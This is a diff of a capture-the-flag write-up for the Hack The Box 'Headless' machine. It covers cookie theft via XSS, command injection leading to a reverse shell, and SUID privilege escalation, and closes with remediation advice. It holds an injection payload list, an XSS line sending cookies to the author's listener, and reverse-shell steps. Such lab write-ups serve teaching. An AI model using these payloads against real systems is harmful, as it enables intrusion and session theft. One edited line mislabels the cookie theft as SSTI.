@@ -24,10 +24,10 @@ output: html_document
   
 **Ports/services exploited:** 5000\\
 **Tools:** Burp\\
-**Techniques:** Cookie stealing, path manipulation\\
-**Keywords:** Werkzeug
+**Techniques:** Cookie stealing, XSS, path manipulation\\
+**Keywords:** Werkzeug, SUID
 
-**TL;DR**: A web application is running on TCP port 5000, and it is vulnerable to SSTI injection. With the right payload, it is possible to steal an admin cookie, thus gaining access to the admin dashboard. This latter is vulnerable to command injection, allowing us to get a reverse shell on the machine. Then, the user has the permissions to run a script as root, and this script calls another script without specifying the absolute path, so we can replace the script with a malicious one. In this malicious script, we can add the SUID bit (Set User ID) to the /bin/bash binary, and spawn /bin/bash as root.
+**TL;DR**: A web application is running on TCP port 5000, and it is vulnerable to SSTI injection. With the right payload, it is possible to steal an admin cookie, thus gaining access to the admin dashboard. This latter allows us to generate a report for a specific date. However, the request itself is vulnerable to command injection, allowing us to get a reverse shell on the machine. Then, the user has the permissions to run a script as root, and this script calls another script without specifying the absolute path, so we can replace the script with a malicious one. In this malicious script, we can add the SUID bit (Set User ID) to the /bin/bash binary, and spawn /bin/bash as root.
 
 ## 1. Services enumeration
 {:style="color:DarkRed; font-size: 170%;"}
@@ -117,13 +117,13 @@ Finally, we see in the HTTP response a header "Set-Cookie" with the value **is_a
 Although we see the title "Under construction", let's visit the page to see if there is anything interesting:
 
 <div class="img_container">
-![webpage]({{https://jsom1.github.io/}}/_images/htb_headless_web.png){: height="300px" width = "400px"}
+![webpage]({{https://jsom1.github.io/}}/_images/htb_headless_web.png){: height="400px" width = "500px"}
 </div>
 
 The only thing we can do is click on "For questions", which yields on the following page:
 
 <div class="img_container">
-![form]({{https://jsom1.github.io/}}/_images/htb_headless_form.png){: height="400px" width = "420px"}
+![form]({{https://jsom1.github.io/}}/_images/htb_headless_form.png){: height="500px" width = "540px"}
 </div>
 
 Before trying anything with this formular, let's launch a *dirb* scan to search for other directories, as well as a *ffuf* scan to search for potential subdomains:
@@ -139,7 +139,7 @@ sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 - http://10.10.11.8:5000/dashboard (CODE:500\|SIZE:265): it seems we can't access the dashboard, but let's head there to see what we find:
 
 <div class="img_container">
-![dashboard]({{https://jsom1.github.io/}}/_images/htb_headless_dash.png){: height="80px" width = "420px"}
+![dashboard]({{https://jsom1.github.io/}}/_images/htb_headless_dash.png){: height="160px" width = "620px"}
 </div>
 
 This is interesting, because it is very likely linked to the cookie we saw in the header. so we have 3 leads now: 
@@ -152,7 +152,7 @@ Let's start by digging into the error message and try to modify the cookie. To d
 Unfortunately, as we see in the image below, it is already the cookie being used.
 
 <div class="img_container">
-![cookie]({{https://jsom1.github.io/}}/_images/htb_headless_cookie.png){: height="300px" width = "400px"}
+![cookie]({{https://jsom1.github.io/}}/_images/htb_headless_cookie.png){: height="400px" width = "500px"}
 </div>
 
 We see something on the right: is_admin is an array consisting of 2 strings: "InVzZXIi" and "uAlmXlTvm8vyihjNaPDWnvB_Zfs". If we decode "InVzZXIi" (Base64) with the following command:
@@ -170,7 +170,7 @@ echo -n "admin" | base64
 This returns "YWRtaW4=", which we replace in the cookie. The new cookie is "YWRtaW4=.uAlmXlTvm8vyihjNaPDWnvB_Zfs". Let's refresh the page:
 
 <div class="img_container">
-![cookie2]({{https://jsom1.github.io/}}/_images/htb_headless_cookie2.png){: height="300px" width = "400px"}
+![cookie2]({{https://jsom1.github.io/}}/_images/htb_headless_cookie2.png){: height="400px" width = "500px"}
 </div>
 
 It doesn't work... We see the parsed value on the right is not the same anymore. It was an array previously, whereas it is an object now. I tried removing the "=" from "YWRtaW4=" (it's called *URL-safe encoding* (base64URL format)), and it's recognized as an array once again. However, the error message is still the same... Let's leave it aside for the moment, and have a look at the formular.
@@ -178,7 +178,7 @@ It doesn't work... We see the parsed value on the right is not the same anymore.
 In particular, let's try a few injections. We fill the formular as follows:
 
 <div class="img_container">
-![form2]({{https://jsom1.github.io/}}/_images/htb_headless_form2.png){: height="400px" width = "420px"}
+![form2]({{https://jsom1.github.io/}}/_images/htb_headless_form2.png){: height="450px" width = "470px"}
 </div>
 
 In the "First Name" field, we try a SQL injection (other payloads: *test' UNION SELECT NULL, NULL, NULL --*, *test' AND 1=1 --*, and so on).\\
@@ -189,11 +189,11 @@ In the "Phone Number" and "Message" fields, we try two command injections.
 Before pressing "Submit", we set up a proxy and start Burp to intercept the request. This way, we will be able to easily try other payloads. Here's the intercepted request:
 
 <div class="img_container">
-![burpreq]({{https://jsom1.github.io/}}/_images/htb_headless_burpreq.png){: height="200px" width = "400px"}
+![burpreq]({{https://jsom1.github.io/}}/_images/htb_headless_burpreq.png){: height="350px" width = "480px"}
 </div>
 
 We see the exact parameter names, as well as the cookie. We can forward the request to see how the server responds: nothing stands out. We get a "HTTP/1.1 200 OK", but nothing happened in the output. The server treated our request without raising any error or message regarding our injection attempt.\\
-However, I could have something in my mail, so let's check that. Well, I didn't receive any mail. Let's send the request to Burp's Intruder. In the "Positions" tab, we select the "Sniper" attack type. We see the cookie is also highlighted in green, which means Burp will replace its value with a payload. I don't think we want that, because the request might not work anymore then. So, we "Clear §" (on the right), and then only highlight the request's parameters. Once this is done, we go to the "Payloads" tab. There, we provide a custom list of payloads to try. The list is called *headless_runtime.txt* and contains de following payloads:
+I didn't receive anything on my mail either. Let's send the request to Burp's Intruder. In the "Positions" tab, we select the "Sniper" attack type. We see the cookie is also highlighted in green, which means Burp will replace its value with a payload. I don't think we want that, because the request might not work anymore then. So, we "Clear §" (on the right), and then only highlight the request's parameters. Once this is done, we go to the "Payloads" tab. There, we provide a custom list of payloads to try. The list is called *headless_runtime.txt* and contains de following payloads:
 
 ```
 ' OR '1'='1
@@ -232,15 +232,15 @@ $(id)
 `id`
 ```
 
-Some of these payloads are for detecting an SSTI vulnerability (such as *{{7\*7}}* and *{{config.items()}}*. This is because Werkzeug is often used with Flask, a framework for web development with Python. In turn, Flask uses *Jinja2* as template engine, and this latter might be vulnerable to SSTI injection.\\
-We're ready to click on "Start attack". The attacks tries every payload above in every possible positions. That means it's sending 34 \* 5 = 170 requests. Here's the result, and we're looking for anything unexpected (status or length):
+Some of these payloads are for detecting an SSTI vulnerability (such as *\{\{7\*7\}\}* and *\{\{config.items()\}\}*. This is because Werkzeug is often used with Flask, a framework for web development with Python. In turn, Flask uses *Jinja2* as template engine, and this latter might be vulnerable to SSTI injection.\\
+We're ready to click on "Start attack". The attacks tries every payload above in every possible positions. That means it's sending 34 \* 5 = 170 requests in total. Here's the result, and we're looking for anything unexpected (status or length):
 
 <div class="img_container">
-![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_intruder.png){: height="420px" width = "400px"}
+![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_intruder.png){: height="600px" width = "600px"}
 </div>
 
 As we see in the image above, the length changes between payloads 147 and 165. Those payloads are the ones testing for an XSS vulnerability (147-156) as well as an SSTI vulnerability (157-164). They triggered the message "*Hacking Attempt Detected. Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation*". Well, sending 170 requests was not that discrete...\\
-After trying different payloads and encoding, I had to look at the forum for a hint. Apparently, we should be able to steal the admin cookie by exploiting an XSS vulnerability. The idea is to submit a message containing a payload which, once seen by an admin, retrieves their cookie and send it back to us. A payload we can try is the following (my IP is *10.10.14.25*):
+After trying different payloads and encoding, I had to look at the forum for a hint. Apparently, we should be able to steal the admin cookie by exploiting an SSTI vulnerability. The idea is to submit a message containing a payload which, once seen by an admin, retrieves their cookie and send it back to us. A payload we can try is the following (my IP is *10.10.14.25*):
 
 ```
 <script>document.location=’http://10.10.14.25:8001/?cookie=’+document.cookie</script> --> didn't work
@@ -250,7 +250,7 @@ After trying different payloads and encoding, I had to look at the forum for a h
 The command that worked comes from <a href="https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e" target="_blank">this article</a>:
 
 <div class="img_container">
-![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_payload.png){: height="250px" width = "400px"}
+![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_payload.png){: height="350px" width = "500px"}
 </div>
 
 Note that before sending the request, we must start a web server on Kali:
@@ -262,25 +262,25 @@ sudo python3 -m http.server 8001
 Then, we send the request. It takes some time to get something back on our server:
 
 <div class="img_container">
-![admin cookie]({{https://jsom1.github.io/}}/_images/htb_headless_admincookie.png){: height="50px" width = "400px"}
+![admin cookie]({{https://jsom1.github.io/}}/_images/htb_headless_admincookie.png)
 </div>
 
 And we have an admin cookie. Because it is mentionned that this cookie is based64 encoded, we also decoded it. We are now ready to use it on the */dashboard* page. We can simply head there, intercept the request, and modify the cookie as follows:
 
 <div class="img_container">
-![replace cookie]({{https://jsom1.github.io/}}/_images/htb_headless_repl.png){: height="200px" width = "400px"}
+![replace cookie]({{https://jsom1.github.io/}}/_images/htb_headless_repl.png){: height="350px" width = "500px"}
 </div>
 
 When we send this request, we finally land on the admin dashboard:
 
 <div class="img_container">
-![admin db]({{https://jsom1.github.io/}}/_images/htb_headless_db.png){: height="200px" width = "400px"}
+![admin db]({{https://jsom1.github.io/}}/_images/htb_headless_db.png){: height="240px" width = "400px"}
 </div>
 
 In the "Select Date" field, we can only chose from an existing date, and we cannot enter anything else. Since Burp is still running, let's click on "Generate Report" and look at the request. In the image below, we're trying a working command injection (*ls*):
 
 <div class="img_container">
-![CI POC]({{https://jsom1.github.io/}}/_images/htb_headless_poc.png)
+![CI POC]({{https://jsom1.github.io/}}/_images/htb_headless_poc.png){: height="350px" width = "500px"}
 </div>
 
 The command is URL-encoded, and we see its output in the response. From there, we can execute commands such as *whoami*, *cat*, and so on... We should then be able to get a reverse shell. I tried with the following command:
@@ -305,7 +305,7 @@ sudo nc -nlvp 4444
 Now, we use the command injection vulnerability to *curl* this file on our machine, and then we execute it on the target:
 
 <div class="img_container">
-![revshell burp]({{https://jsom1.github.io/}}/_images/htb_headless_lastburp.png){: height="200px" width = "400px"}
+![revshell burp]({{https://jsom1.github.io/}}/_images/htb_headless_lastburp.png){: height="350px" width = "500px"}
 </div>
 
 The web server logs show a GET request from 10.10.11.8 (*"GET /headless_payload.sh HTTP/1.1" 200*), and we reveive a connexion on our listener:
@@ -325,13 +325,13 @@ As usual, let's start by checking this user's permissions:
 ![sudol]({{https://jsom1.github.io/}}/_images/htb_headless_sudol.png)
 </div>
 
-This is promising, because we see they can run */usr/bin/syscheck* as the root user. 
+This is promising, because we see *dvir* can run */usr/bin/syscheck* as the root user without providing a pasword. 
 
 <div class="img_container">
 ![syscheck]({{https://jsom1.github.io/}}/_images/htb_headless_syscheck.png)
 </div>
 
-The script checks the system status et take actions in consequence. First, it checks that the user who runs it is root (EUID = 0). If this is not the case, the script stops.\\
+The script checks the system status and take actions in consequence. First, it checks that the user who runs it is root (EUID = 0). If this is not the case, the script stops.\\
 Then, it uses the command *find* to search for *vmlinuz* files in the */boot* directory, and it uses *stat* to retrieve the date of the last modification. Then, it formats this date and displays it.\\
 After that, it uses the *df* command to obtain and display the available disk space in the root partition (/).\\
 Then, it uses the *uptime* command to obtain and display the mean charge of the system.\\
@@ -348,6 +348,8 @@ The *chmod* command modifies the permissions. The *u+s* option specifies that th
 ![root]({{https://jsom1.github.io/}}/_images/htb_headless_root.png)
 </div>
 
+Note that the "*-p*" in the command "*/bin/bash -p*" is the *privileged* option. When we use that option, it spawns a new Bash shell with root permisions. Once we have this shell, we see we're root and we can do anything on the machine!
+
 <div class="img_container">
 ![pwn]({{https://jsom1.github.io/}}/_images/htb_headless_pwn.png)
 </div>
@@ -359,5 +361,5 @@ I found the initial foothold quite hard, because once I had the admin cookie, I 
 
 <ins>**Fix the vulnerabilities**</ins>
 
-SSTI and CI :
-Regarding the privesc, the use of *chmod u+s* on binaries such as */bin/bash* shouldn't be authorized.
+For the SSTI and CI : user inputs should be validated in a better way. We saw some "Hacking attempt detected" messages, but apparently the checks are not robust enough.
+Regarding the privesc, the use of *chmod u+s* on binaries such as */bin/bash* shouldn't be authorized. The easiest would be to prevent any user who isn't root to use *chmod*. Also, it is very insecure to specify a program without specifying the absolute path. This latter should have been in a directory that is not accessible/editable by a regular user.
